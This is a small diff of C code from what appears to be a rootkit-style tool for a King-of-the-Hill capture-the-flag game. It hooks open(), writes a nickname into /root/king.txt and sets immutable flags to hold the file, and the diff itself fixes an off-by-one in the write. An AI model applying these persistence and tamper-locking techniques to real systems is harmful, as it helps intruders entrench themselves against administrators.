@@ -165,7 +165,7 @@ int king() {
     kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
     ioctl(kingfd, FS_IOC_SETFLAGS, 0);
     //write nick to king.txt
-    write(kingfd, KING_NAME, sizeof(KING_NAME));
+    write(kingfd, KING_NAME, (sizeof(KING_NAME) -1));
     //set immutable and append-only flags
     ioctl(kingfd, FS_IOC_SETFLAGS, 16);
     ioctl(rootfd, FS_IOC_SETFLAGS, 16);
